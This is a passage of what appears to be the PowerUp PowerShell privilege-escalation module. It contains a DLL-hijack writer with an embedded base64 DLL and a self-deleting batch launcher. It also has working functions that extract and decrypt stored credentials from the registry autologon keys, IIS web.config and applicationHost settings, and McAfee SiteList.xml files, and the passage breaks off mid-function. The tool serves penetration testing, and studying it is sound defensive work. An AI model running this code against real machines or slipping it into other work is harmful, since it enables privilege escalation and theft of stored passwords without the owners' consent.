KQopiisKO4o8Cj4KPoowCAAAA0AAAAuKDIoNig6KD4oAihGKEooTihSKFYoWiheKGIoZihqKG4ocih2KHoofihCKIAkAAAzAAAAKChqKGwobihwKHIodCh2KHgoeih8KH4oQCiCKIQohiiIKIoojCiOKJAokiiUKJYomCiaKJwoniigKKIopCimKKgoqiisKK4osCiyKLQotii4KLoovCi+KIAowijEKMYoyCjKKMwozijQKNIo1CjWKNgo2ijcKN4o4CjiKOQo5ijoKOoo7CjuKPAo8ij0KPYo+Cj6KPwo/ijAKQIpBCkGKQgpCikMKQ4pECkSKRQpFikYKRopHCkeKSApIikkKSYpKCkAAAAsAAAFAEAABCgOKC4oDCjOKNAo0ijUKNYo2CjaKNwo3ijgKOIo5CjmKOgo6ijsKO4o8CjyKPQo9ij4KPoo/Cj+KMApAikEKQYpCCkKKQwpDikQKRIpFCkWKRgpGikcKR4pICkmKSgpKiksKS4pMCkyKTQpNik4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeCl6KVYpnimmKa4ptimGKcwpzinQKdIp1CnkKsArgiuEK4YriCuKK4wrjiuQK5IrliuYK5ornCueK6AroiukK6YrqCuqK64rsCuyK7Qrtiu4K7orvCuAK8IryCvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

    if ($PSBoundParameters['Architecture']) {
        $TargetArchitecture = $Architecture
    }
    elseif ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {
        $TargetArchitecture = 'x64'
    }
    else {
        $TargetArchitecture = 'x86'
    }

    if ($TargetArchitecture -eq 'x64') {
        [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
    }
    else {
        [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
    }

    if ($PSBoundParameters['BatPath']) {
        $TargetBatPath = $BatPath
    }
    else {
        $BasePath = $DllPath | Split-Path -Parent
        $TargetBatPath = "$BasePath\debug.bat"
    }

    # patch in the appropriate .bat launcher path
    $DllBytes = Invoke-PatchDll -DllBytes $DllBytes -SearchString 'debug.bat' -ReplaceString $TargetBatPath

    # build the launcher .bat
    if (Test-Path $TargetBatPath) { Remove-Item -Force $TargetBatPath }

    "@echo off" | Out-File -Encoding ASCII -Append $TargetBatPath
    "start /b $BatCommand" | Out-File -Encoding ASCII -Append $TargetBatPath
    'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $TargetBatPath

    Write-Verbose ".bat launcher written to: $TargetBatPath"
    Set-Content -Value $DllBytes -Encoding Byte -Path $DllPath
    Write-Verbose "$TargetArchitecture DLL Hijacker written to: $DllPath"

    $Out = New-Object PSObject
    $Out | Add-Member Noteproperty 'DllPath' $DllPath
    $Out | Add-Member Noteproperty 'Architecture' $TargetArchitecture
    $Out | Add-Member Noteproperty 'BatLauncherPath' $TargetBatPath
    $Out | Add-Member Noteproperty 'Command' $BatCommand
    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL')
    $Out
}


########################################################
#
# Registry Checks
#
########################################################

function Get-RegistryAlwaysInstallElevated {
<#
.SYNOPSIS

Checks if any of the AlwaysInstallElevated registry keys are set.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Returns $True if the HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
or the HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated keys
are set, $False otherwise. If one of these keys are set, then all .MSI files run with
elevated permissions, regardless of current user permissions.

.EXAMPLE

Get-RegistryAlwaysInstallElevated

Returns $True if any of the AlwaysInstallElevated registry keys are set.

.OUTPUTS

System.Boolean

$True if RegistryAlwaysInstallElevated is set, $False otherwise.
#>

    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    if (Test-Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer') {

        $HKLMval = (Get-ItemProperty -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path 'HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"

            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose 'AlwaysInstallElevated enabled on this machine!'
                $True
            }
            else{
                Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
                $False
            }
        }
        else{
            Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
            $False
        }
    }
    else{
        Write-Verbose 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-RegistryAutoLogon {
<#
.SYNOPSIS

Finds any autologon credentials left in the registry.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Checks if any autologon accounts/credentials are set in a number of registry locations.
If they are, the credentials are extracted and returned as a custom PSObject.

.EXAMPLE

Get-RegistryAutoLogon

Finds any autologon credentials left in the registry.

.OUTPUTS

PowerUp.RegistryAutoLogon

Custom PSObject containing autologin credentials found in the registry.

.LINK

https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
#>

    [OutputType('PowerUp.RegistryAutoLogon')]
    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {

        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($DefaultUserName -or $AltDefaultUserName) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.RegistryAutoLogon')
            $Out
        }
    }
}

function Get-ModifiableRegistryAutoRun {
<#
.SYNOPSIS

Returns any elevated system autoruns in which the current user can
modify part of the path string.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-ModifiablePath  

.DESCRIPTION

Enumerates a number of autorun specifications in HKLM and filters any
autoruns through Get-ModifiablePath, returning any file/config locations
in the found path strings that the current user can modify.

.EXAMPLE

Get-ModifiableRegistryAutoRun

Return vulneable autorun binaries (or associated configs).

.OUTPUTS

PowerUp.ModifiableRegistryAutoRun

Custom PSObject containing results.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableRegistryAutoRun')]
    [CmdletBinding()]
    Param()

    $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {

        $Keys = Get-Item -Path $_
        $ParentPath = $_

        ForEach ($Name in $Keys.GetValueNames()) {

            $Path = $($Keys.GetValue($Name))

            $Path | Get-ModifiablePath | ForEach-Object {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModifiableFile' $_
                $Out | Add-Member Aliasproperty Name Key
                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableRegistryAutoRun')
                $Out
            }
        }
    }

    $ErrorActionPreference = $OrigError
}


########################################################
#
# Miscellaneous checks
#
########################################################

function Get-ModifiableScheduledTaskFile {
<#
.SYNOPSIS

Returns scheduled tasks where the current user can modify any file
in the associated task action string.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-ModifiablePath  

.DESCRIPTION

Enumerates all scheduled tasks by recursively listing "$($ENV:windir)\System32\Tasks"
and parses the XML specification for each task, extracting the command triggers.
Each trigger string is filtered through Get-ModifiablePath, returning any file/config
locations in the found path strings that the current user can modify.

.EXAMPLE

Get-ModifiableScheduledTaskFile

Return scheduled tasks with modifiable command strings.

.OUTPUTS

PowerUp.ModifiableScheduledTaskFile

Custom PSObject containing results.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableScheduledTaskFile')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Path = "$($ENV:windir)\System32\Tasks"

    # recursively enumerate all schtask .xmls
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            $TaskName = $_.Name
            $TaskXML = [xml] (Get-Content $_.FullName)
            if ($TaskXML.Task.Triggers) {

                $TaskTrigger = $TaskXML.Task.Triggers.OuterXML

                # check schtask command
                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $Out
                }

                # check schtask arguments
                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $Out
                }
            }
        }
        catch {
            Write-Verbose "Error: $_"
        }
    }
    $ErrorActionPreference = $OrigError
}


function Get-UnattendedInstallFile {
<#
.SYNOPSIS

Checks several locations for remaining unattended installation files,
which may have deployment credentials.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.EXAMPLE

Get-UnattendedInstallFile

Finds any remaining unattended installation files.

.LINK

http://www.fuzzysecurity.com/tutorials/16.html

.OUTPUTS

PowerUp.UnattendedInstallFile

Custom PSObject containing results.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnattendedInstallFile')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )

    # test the existence of each path and return anything found
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out | Add-Member Aliasproperty Name UnattendPath
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnattendedInstallFile')
        $Out
    }

    $ErrorActionPreference = $OrigError
}


function Get-WebConfig {
<#
.SYNOPSIS

This script will recover cleartext and encrypted connection strings from all web.config
files on the system. Also, it will decrypt them if needed.

Author: Scott Sutherland, Antti Rantasaari  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This script will identify all of the web.config files on the system and recover the
connection strings used to support authentication to backend databases.  If needed, the
script will also decrypt the connection strings on the fly.  The output supports the
pipeline which can be used to convert all of the results into a pretty table by piping
to format-table.

.EXAMPLE

Return a list of cleartext and decrypted connect strings from web.config files.

Get-WebConfig

user   : s1admin
pass   : s1password
dbserv : 192.168.1.103\server1
vdir   : C:\test2
path   : C:\test2\web.config
encr   : No

user   : s1user
pass   : s1password
dbserv : 192.168.1.103\server1
vdir   : C:\inetpub\wwwroot
path   : C:\inetpub\wwwroot\web.config
encr   : Yes

.EXAMPLE

Return a list of clear text and decrypted connect strings from web.config files.

Get-WebConfig | Format-Table -Autosize

user    pass       dbserv                vdir               path                          encr
----    ----       ------                ----               ----                          ----
s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No
s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No
s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No
s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes
s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No

.OUTPUTS

System.Boolean

System.Data.DataTable

.LINK

https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
http://www.netspi.com
https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx

.NOTES

Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings

Author: Scott Sutherland - 2014, NetSPI
Author: Antti Rantasaari - 2014, NetSPI
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Boolean')]
    [OutputType('System.Data.DataTable')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {

        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('dbserv')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('path')
        $Null = $DataTable.Columns.Add('encr')

        # Get list of virtual directories in IIS
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
        ForEach-Object {

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*") {
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split('%')[2]
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {

                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {

                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add|
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if ($MyConString -like '*password*') {
                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                            $ConfVdir = $CurrentVdir
                            $ConfEnc = 'No'
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\web.config'

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }

                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        # Decrypt web.config in user temp
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add) {

                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if ($MyConString -like '*password*') {
                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                                }
                            }
                        }
                        else {
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }

        # Check if any connection strings were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable | Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            Write-Verbose 'No connection strings found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-ApplicationHost {
<#
.SYNOPSIS

Recovers encrypted application pool and virtual directory passwords from the applicationHost.config on the system.

Author: Scott Sutherland  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This script will decrypt and recover application pool and virtual directory passwords
from the applicationHost.config file on the system.  The output supports the
pipeline which can be used to convert all of the results into a pretty table by piping
to format-table.

.EXAMPLE

Return application pool and virtual directory passwords from the applicationHost.config on the system.

Get-ApplicationHost

user    : PoolUser1
pass    : PoolParty1!
type    : Application Pool
vdir    : NA
apppool : ApplicationPool1
user    : PoolUser2
pass    : PoolParty2!
type    : Application Pool
vdir    : NA
apppool : ApplicationPool2
user    : VdirUser1
pass    : VdirPassword1!
type    : Virtual Directory
vdir    : site1/vdir1/
apppool : NA
user    : VdirUser2
pass    : VdirPassword2!
type    : Virtual Directory
vdir    : site2/
apppool : NA

.EXAMPLE

Return a list of cleartext and decrypted connect strings from web.config files.

Get-ApplicationHost | Format-Table -Autosize

user          pass               type              vdir         apppool
----          ----               ----              ----         -------
PoolUser1     PoolParty1!       Application Pool   NA           ApplicationPool1
PoolUser2     PoolParty2!       Application Pool   NA           ApplicationPool2
VdirUser1     VdirPassword1!    Virtual Directory  site1/vdir1/ NA
VdirUser2     VdirPassword2!    Virtual Directory  site2/       NA

.OUTPUTS

System.Data.DataTable

System.Boolean

.LINK

https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
http://www.netspi.com
http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx

.NOTES

Author: Scott Sutherland - 2014, NetSPI
Version: Get-ApplicationHost v1.0
Comments: Should work on IIS 6 and Above
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Data.DataTable')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('type')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('apppool')

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-SiteListPassword {
<#
.SYNOPSIS

Retrieves the plaintext passwords for found McAfee's SiteList.xml files.
Based on Jerome Nokin (@funoverip)'s Python solution (in links).

Author: Jerome Nokin (@funoverip)  
PowerShell Port: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Searches for any McAfee SiteList.xml in C:\Program Files\, C:\Program Files (x86)\,
C:\Documents and Settings\, or C:\Users\. For any files found, the appropriate
credential fields are extracted and decrypted using the internal Get-DecryptedSitelistPassword
function that takes advantage of McAfee's static key encryption. Any decrypted credentials
are output in custom objects. See links for more information.

.PARAMETER Path

Optional path to a SiteList.xml file or folder.

.EXAMPLE

Get-SiteListPassword

EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
UserName    :
Path        : Products/CommonUpdater
Name        : McAfeeHttp
DecPassword : MyStrongPassword!
Enabled     : 1
DomainName  :
Server      : update.nai.com:80

EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
UserName    : McAfeeService
Path        : Repository$
Name        : Paris
DecPassword : MyStrongPassword!
Enabled     : 1
DomainName  : companydomain
Server      : paris001

EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
UserName    : McAfeeService
Path        : Repository$
Name        : Tokyo
DecPassword : MyStrongPassword!
Enabled     : 1
DomainName  : companydomain
Server      : tokyo000

.OUTPUTS

PowerUp.SiteListPassword

.LINK

https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
https://github.com/tfairane/HackStory/blob/master/McAfeePrivesc.md
https://www.syss.de/fileadmin/dokumente/Publikationen/2011/SySS_2011_Deeg_Privilege_Escalation_via_Antivirus_Software.pdf
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.SiteListPassword')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String[]]
        $Path
    )

    BEGIN {
        function Local:Get-DecryptedSitelistPassword {
            # PowerShell adaptation of https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
            # Original Author: Jerome Nokin (@funoverip / jerome.nokin@gmail.com)
            # port by @harmj0y
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $B64Pass
            )

            # make sure the appropriate assemblies are loaded
            Add-Type -Assembly System.Security
            Add-Type -Assembly System.Core

            # declare the encoding/crypto providers we need
            $Encoding = [System.Text.Encoding]::ASCII
            $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
            $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

            # static McAfee key XOR key LOL
